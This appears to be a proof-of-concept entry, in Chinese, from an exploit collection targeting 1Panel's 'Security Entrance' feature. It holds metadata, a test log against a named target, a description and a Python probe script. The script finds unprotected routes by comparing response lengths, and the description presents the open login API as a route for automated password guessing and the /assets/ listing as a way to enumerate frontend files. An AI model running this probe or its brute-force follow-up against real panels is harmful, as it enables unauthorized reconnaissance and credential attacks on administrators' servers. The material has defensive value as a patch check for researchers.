# 1Panel 安全入口（Security Entrance）旁路探测：未认证路由与 /assets/ 静态目录不受入口保护

- **code**: 1panel-安全入口-security-entrance-旁路探测-未认证路由与-assets-静态目录不受入口保护
- **kind**: poc
- **category**: auth-bypass
- **component**: 1Panel
- **versions**: < 2.0.14（XFF 绕过 2.0.14 修复，本目标已不生效，但登录接口未被入口保护的现象依旧存在）
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 tgt7737-org 靶标 203.0.113.110:9527（1Panel 安全入口已启用，拦截页 1410 字节）实测：POST /api/v1/auth/login → 200 JSON{"code":406,"message":"ErrCaptchaCode"}；GET /api/v1/auth/captcha → 200 {"code":200,"data":{"captchaID":"nGh3XA9hQ4KKt7GsQcZ","imagePath":"data:image/png;base64,..."}}；GET /api/v1/dashboard/base/os → 200 {"code":401,"message":"用户未登录"}；GET /assets/ 与 /assets/js/ → 200 Go FileServer 目录列表（含 mysql-*.js / redis-*.js / database-*.js / 1panel-logo-*.js 等约 170 个 chunk）。对照 47 条路径（/、/login、/api/v1/settings/search、/debug/pprof/、/metrics、/swagger/ 等）均为 1410 拦截页。伪造 X-Forwarded-For/X-Real-IP/Forwarded: 127.0.0.1 无法绕过入口（CVE-2025-66508 不生效）。
- **path**: pocs/1panel-安全入口-security-entrance-旁路探测-未认证路由与-assets-静态目录不受入口保护/1panel_entrance_probe.py
- **tags**: 1panel,security-entrance,未授权,目录遍历,信息泄露
- **created_at**: 2026-09-27T18:01:50.060Z
- **found_by**: exploit

## 描述

1Panel v2 的「安全入口」(Security Entrance) 中间件是按路由挂载的：开启安全入口后，面板首页/绝大多数 /api/v1/** 返回固定长度（本目标为 1410 字节）的拦截页，但未认证路由（POST /api/v1/auth/login、GET /api/v1/auth/captcha、GET /api/v1/dashboard/base/os）与 /assets/ 静态目录不受保护。利用点：入口本身形同虚设——登录 API 仍对全网开放，可直接发起自动化口令尝试；/assets/ 若为 Go http.FileServer 则返回目录列表，可无认证枚举/下载全部前端产物（模块结构、chunk 名、API 路径）。探测方法：先用 GET / 拿到拦截页字节数作为基线，再逐路径比对，长度不同者即为未被拦截。注意 POST 与 GET 的路由差异（GET /api/v1/auth/login 会落到 404 → 被入口拦截页覆盖，POST 才命中真实路由）。CVE-2025-66508 的 X-Forwarded-For 伪造在已打补丁的实例上不生效，可作为补丁判据。

## 用法

```
python 1panel_entrance_probe.py
1) 把 BASE 换成目标面板地址（默认 9527 端口）；2) 先确认 GET / 的拦截页字节数并填入 BLOCK_LEN；3) 运行后凡响应长度 != BLOCK_LEN 即未被入口拦截；4) 对 /api/v1/auth/login 必须用 POST（改 get() 为 POST，body 参考 panel_login_brute.py）。
```

## 正文

```
import time, urllib.request, urllib.error

BASE = "http://<TARGET>:9527"
BLOCK_LEN = 1410   # 1Panel 安全入口拦截页固定长度（需先实测确认）

PATHS = ["/assets/", "/favicon.ico", "/api/v1/auth/login", "/api/v1/auth/captcha",
         "/api/v1/auth/mfa", "/api/v1/dashboard/base/os", "/api/v1/settings/search",
         "/api/v1/files/search", "/api/v1/hosts/ssh/search", "/debug/pprof/",
         "/metrics", "/health", "/swagger/", "/terminal", "/ws",
         "/api/v1/system/version", "/api/v1/dashboard/version", "/robots.txt"]

def get(path):
    req = urllib.request.Request(BASE + path, headers={"User-Agent": "Mozilla/5.0"})
    try:
        r = urllib.request.urlopen(req, timeout=10)
        return r.status, r.read(200000)
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000)
    except Exception as e:
        return None, str(e).encode()

for p in PATHS:
    code, body = get(p)          # 注意：POST /api/v1/auth/login 需用 POST 才命中路由
    tag = "*** 未被入口拦截 ***" if len(body) != BLOCK_LEN else ""
    print("%-34s code=%-5s len=%-7s %s" % (p, code, len(body), tag))
    time.sleep(0.25)
```
